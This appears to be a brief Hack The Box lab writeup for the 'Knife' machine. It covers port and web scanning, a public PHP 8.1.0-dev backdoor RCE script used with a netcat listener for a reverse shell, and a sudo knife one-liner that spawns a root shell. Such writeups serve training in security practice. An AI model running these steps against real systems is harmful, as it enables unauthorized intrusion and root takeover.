+++ 
title = "Knife HTB Writeup"
description = "Write up for the HTB machine 'Knife'"
author = "greatmoves"
tags = ["php", "sudo -l", "hackthebox"]
+++

## Recon

### nmap
A simple nmap scan: `nmap -sC -sV {target-ip}` reveals port 22-ssh and port 80-http.

### nikto
A nikto scan using the command `nikto -host {target-ip}` reveals that the web application is using `PHP/8.1.0-dev`.

A quick google search of this PHP version shows us a Backdoor Remote Code Execution script found at:
https://github.com/flast101/php-8.1.0-dev-backdoor-rce

Run the script along with a netcat listener and catch your reverse shell!

Navigate to /home/james for user.txt.

## Privilege escalation
As our user let's see if there's anything they are able to run as root using the command `sudo -l`

which reveals:
```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

Looking up "knife" on https://gtfobins.github.io/ we find the command `sudo knife exec -E 'exec "/bin/sh"'`, so let's run it.

root :)

Navigate to /root for root.txt